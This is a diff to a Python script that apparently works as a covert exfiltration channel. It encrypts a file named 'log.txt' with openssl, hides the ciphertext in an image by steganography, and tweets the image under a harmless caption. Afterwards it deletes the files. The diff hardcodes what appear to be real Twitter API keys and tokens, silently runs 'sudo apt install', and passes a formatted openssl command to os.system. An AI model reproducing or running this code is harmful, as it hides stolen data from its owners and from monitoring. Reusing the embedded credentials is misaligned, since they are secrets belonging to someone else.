@@ -4,33 +4,45 @@ import sys
 import json
 import random
 from io import BytesIO
-pip_present = True
+
 try:
     import pip
 except ImportError:
-    pip_present = False
     os.system('sudo apt install python3-venv python3-pip')
+
+def install(package):
+    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+
 try:
     import tweepy
 except ImportError:
     install("tweepy")
+    import tweepy
 
-stegano_install = False
 try:
     from stegano import lsb
-    stegano_install = True
 except ImportError:
     install("Stegano")
+    from stegano import lsb
 
 try:
     import PIL
 except ImportError:
     install("Pillow")
+    import PIL
 
 try:
     import requests
 except ImportError:
     install("requests")
+    import requests
+
+try:
+    import tweepy
+except ImportError:
+    install("tweepy")
+    import tweepy
+
 
 def getConfig():
     #TODO get information from configuration file
@@ -78,13 +90,8 @@ def getImage():
         return None
 
 
-def install(package):
-    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
-
-
 #hide message into image
 def stenographizeImage(ImagePath,NewImagePath,Text):
-    
     secret_image = lsb.hide(ImagePath,message=Text)
     secret_image.save(NewImagePath)
 
@@ -95,8 +102,48 @@ def deStenographizeImage(ImagePath):
     revealedMessage = revealedMessage[2:len(revealedMessage)-1]
     return revealedMessage
 
+def encrypt(password, logged_file, encrypted_file):
+    enc_scheme = "-aes-128-cbc"
+    opts = "-a -A -nosalt"
+    openssl_cmd = 'openssl enc -pass pass:{} {} {} -in {} -out {} -nosalt 2> /dev/null '.format(password, enc_scheme, opts, logged_file, encrypted_file)
+
+    try:
+        os.system(openssl_cmd)
+    except Exception as e:
+        print(e)
+
+def decrypt(password, encrypted_file, logged_file):
+    enc_scheme = "-aes-128-cbc"
+    opts = "-d -a -A -nosalt"
+    openssl_cmd = 'openssl enc -pass pass:{} {} {} -in {} -out {} -nosalt 2> /dev/null '.format(password, enc_scheme, opts, encrypted_file, logged_file)
+
+    try:
+        os.system(openssl_cmd)
+    except Exception as e:
+        print(e)
+
+def cleanup(files):
+    for eaFile in files:
+        if os.path.exists(eaFile):
+            os.remove(eaFile)
+
+# tweet image
+def tweetSetup():
+    consumer_key = '94lE6CQUO1NcpfGUjbY7a2D32'
+    consumer_key_secret = 'BSkoyZTEIm3oMIPvLWSOcCqnFd0w9n1WagP0SY43ztGxI8cOlz'
+    access_token = '1265315199197736960-WCposgyu6MQ3y1hlAJj8enfRbwyLBI'
+    access_token_secret = 'oJ9K73Fw3E5GZiAB9ftqvlGsopbexqi2n2OoYISxjqfdA'
+
+    auth = tweepy.OAuthHandler(consumer_key, consumer_key_secret)
+    auth.set_access_token(access_token, access_token_secret)
+    return tweepy.API(auth)
+
+def tweetImage(tw_api, image_path, tw_text="I love lemons"):
+    im_handler = tw_api.media_upload(image_path)
+    media_ids = [im_handler.media_id_string]
+    status = tw_api.update_status(tw_text, media_ids=media_ids)
+
 def main():
-    
 
     """
     Image size of 600x600 = 360,000 pixels
@@ -110,6 +157,7 @@ def main():
     image_name = "test_image"
     ImagePath = "./" + image_name + ".png"
     NewImagePath = "./" + image_name + "_new" + ".png"
+
     JPEG_IMG = getImage()
     JPEG_IMG.save(ImagePath)
     PNG_IMAGE = PIL.Image.open(ImagePath)
@@ -119,23 +167,21 @@ def main():
     logged_file = "log.txt"
     encrypted_file = "encrypted.txt"
     password = "password"
-    #encrypt message
-    openssl_command = "openssl enc -pass pass:"+ password +" -aes-128-cbc -a -A -in "+ logged_file +" -out " + encrypted_file + " -nosalt 2> /dev/null "
-    try:
-        os.system(openssl_command)
-    except Exception as e:
-        print(e)
 
+    encrypt(password, logged_file, encrypted_file)
 
-
-    with open('encrypted.txt','rb') as encrypted_text:
+    with open(encrypted_file,'rb') as encrypted_text:
         message = str(encrypted_text.read())
-        if image_text_storage > len(message):
+        if image_text_storage <= len(message):
+            # TODO msg too large. 
+            # Can consider sending multiple tweets or multiple images in one tweet
+            pass
+        else:
             stenographizeImage(ImagePath,NewImagePath,message)
-            #TODO send image to Twitter
+            tw_api = tweetSetup()
+            tweetImage(tw_api, NewImagePath)
 
-
-
-            
+    files = [ImagePath, NewImagePath, logged_file, encrypted_file]
+    cleanup(files)
 
 main()
